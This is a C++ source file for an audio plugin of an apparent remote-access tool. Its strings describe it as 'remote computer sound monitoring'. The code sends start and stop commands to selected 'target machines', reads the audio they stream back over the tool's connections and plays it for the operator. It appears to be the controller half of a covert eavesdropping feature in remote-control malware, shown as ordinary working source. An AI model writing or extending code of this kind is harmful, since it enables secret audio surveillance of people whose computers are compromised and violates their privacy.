#include "StdAfx.h"
#include "AudioPlugin.h"
#include "AudioForm.h"
#include "macro.h"
#include "conn.h"
#include "Buffer.h"
#include "audio.h"

CAudio* m_Audio = 0;

#include <set>
#include <process.h>

using namespace std;

conn lastS = 0;
conn currS = 0;
bool willClose = false;
DispatchData gParam;
AudioForm* gView;
set<conn>	gSets;

static void CloseOthers()
{
	for(set<conn>::iterator i = gSets.begin(); i != gSets.end(); i++)
	{
		__try
		{
			if(*i != currS)
				ISite::SendCmd(CONTROL_AUDIO_CLOSE, *i, NULL, 0);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			KDebug("CloseOthers exception");
		}
	}
}

AudioPlugin::AudioPlugin()
{
	strcpy(m_plugInfo.sAuthor, "greatyao");
	strcpy(m_plugInfo.sName, "声音监听");
	strcpy(m_plugInfo.sDesc, "远程计算机声音监听");
	m_plugInfo.uReserved = 0x0100;
}

AudioPlugin::~AudioPlugin()
{
}

void AudioPlugin:: OnCreateDocTemplate()
{
	m_docTemp = new CMultiDocTemplate(
		GetMinResId() + 1,
		RUNTIME_CLASS(PluginDoc),
		RUNTIME_CLASS(CMDIChildWnd),
		RUNTIME_CLASS(AudioForm));
	ISite::AddDocTemplate(m_docTemp);
}


void AudioPlugin::OnCreateFrameMenu(CMenu* pMenu)
{
	pMenu->GetSubMenu(2)->AppendMenu(MF_STRING, GetMinResId() + 2, "声音监听");
}

void AudioPlugin::OnCreateFrameToolBar(ToolBarData* pArr,UINT& count)
{
	pArr->uIconId = IDB_BITMAPAUDIO;
	pArr->uId = GetMinResId() + 2;
	strcpy(pArr->sName, "声音监听");	
	strcpy(pArr->sTip, "远程计算机声音监听");	

	count = 1;
}

void AudioPlugin::OnCommand(UINT uId)
{
	if (uId == GetMinResId() + 2)
	{
		ISite::CreateFrameWnd(m_docTemp, RUNTIME_CLASS(AudioForm), "声音监听");
		willClose = false;
		CloseOthers();
		if(currS)
			ISite::SendCmd(CONTROL_AUDIO_INIT, currS, NULL, 0);
	}
}

void AudioPlugin::OnCreateDockPane(DockPane* pArr,UINT& count)
{	
	count = 0;
}

void AudioPlugin::OnNotify(UINT id, WPARAM wp, LPARAM lp)
{
	if(wp == NULL)	return;

	AudioForm* pView = NULL;
	POSITION posdoc = m_docTemp->GetFirstDocPosition();
	while(posdoc != NULL)
	{
		CDocument* pdoc = m_docTemp->GetNextDoc(posdoc);
		POSITION posview = pdoc->GetFirstViewPosition();
		pView = (AudioForm*)(pdoc->GetNextView(posview));
	}

	if(willClose == true)	return;

	if(id == ZCM_SEL_OBJ)//选择了新的目标机
	{
		STANDARDDATA* pSD = (STANDARDDATA*)wp;
		if(currS == pSD->s)	return;
		
		lastS = currS;
		currS = pSD->s;
		gSets.insert(currS);

		if( pView)
		{
			//关闭前面的声音
			CloseOthers();
			//打开现在用户的声音
			if(IsCurrentWorking())
				ISite::SendCmd(CONTROL_AUDIO_INIT, currS, NULL, 0);
		}
	}
	else if(id == ZCM_WM_AUDIO)
	{
		if(m_Audio == NULL)	m_Audio = new CAudio;
		gView = pView;
		memcpy(&gParam, (void*)wp, sizeof(gParam));
		_beginthreadex(NULL, 0, audioThread, NULL, 0, NULL);
	}
	else if(id == ZCM_WM_OFFLINE)
	{
		STANDARDDATA* pSD = (STANDARDDATA*)wp;
		gSets.erase(pSD->s);
	}
	else if(IsCurrentWorking() == false)//当前插件不在前端	
		return;
	else if(id == ZCM_RECV_MSG)//收到目标机的发送回来的消息
	{
		DispatchData* data = (DispatchData*)wp;
		control_header* header = data->recvData.header;
		unsigned short cmd = header->command;
		unsigned short resp = header->response;
		
		if(cmd < CONTROL_AUDIO_INIT || cmd > CONTROL_AUDIO_CLOSE)
			return;

		if(resp != 0)
			pView->OnOperationFailed(cmd, resp);
	}
}

unsigned AudioPlugin::audioThread(void* p)
{
	int nStatus = 0;
	conn ftpfd = gParam.s;
	int listenType = gParam.recvData.type;
	int imgSize = 3000;
	char* img = new char[3000];
	int (*myWrite)(conn, char*, char*, int, int) = gParam.WriteFunction;
	int (*myRead)(conn, char*, int, int, int, int) = gParam.readFunction;
	int flags = listenType == CONN_HTTP_SERVER ? 0 : 1;
	
	while(1)
	{
		__try
		{
			struct control_header header = {0};
			int nRecv;

			//首先读取声音控制信息
			int nRead = myRead(ftpfd, (char*)&header, sizeof(header), 0, 0, flags);
			if(nRead < 0 || (nRead == 0 && listenType != CONN_HTTP_SERVER))
			{
				KDebug("Read from %p failed", ftpfd);
				nStatus = -1; 
				goto leave; 
			}

			if(!ISVALID_HEADER(header))
			{
				KDebug("audioThread ISVALID_HEADER %s = FALSE", header.magic);
				continue;
			}

			if(header.dataLen > 0)
			{
				//然后读取声音数据
				nRead = myRead(ftpfd, img, header.dataLen, header.isCompressed, imgSize, flags);
				if(nRead > 0 || (nRead == 0 && listenType == CONN_HTTP_SERVER))	header.dataLen = nRead; 
				else
				{
					if(nRead <= -2)	
					{
						KDebug("Read data encrypt from %p failed", ftpfd);
						continue;
					}
					else	
					{
						KDebug("Connection %p lost", ftpfd);
						nStatus = -1;
						break;
					}
				}
			}

			//处理声音数据
			unsigned short cmd = header.command;
			unsigned short resp = header.response;
			int dataLen = header.dataLen;
			int seq = header.seq;
			static CBuffer recvBuf;

			if(resp != 0)
			{
				gView->OnOperationFailed(cmd, resp);
				continue;
			}

			if(seq == 1 && dataLen > 0)	recvBuf.ClearBuffer() ;

			if(dataLen > 0)	recvBuf.Write((PBYTE)img, dataLen);
			else
			{
				if(cmd == CONTROL_AUDIO_DATA)
				{
					int len  = recvBuf.GetBufferLen();
					//KDebug("ProcessData2 %d", len);
					gView->ProcessData(len);
					m_Audio->playBuffer(recvBuf.GetBuffer(0), len);
				}
			}
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			KDebug("audioThread exception");
		}
	}

leave:
	delete []img;
	return nStatus;
}

BOOL AudioPlugin::OnInitalize()
{
	return TRUE;
}

BOOL AudioPlugin::OnUninitalize()
{
	return TRUE;
}

void AudioPlugin::OnCommandUI(CCmdUI* pCmdUI)
{
}

void AudioPlugin::CloseAudio()
{
	ISite::SendCmd(CONTROL_AUDIO_CLOSE, currS, NULL, 0);
}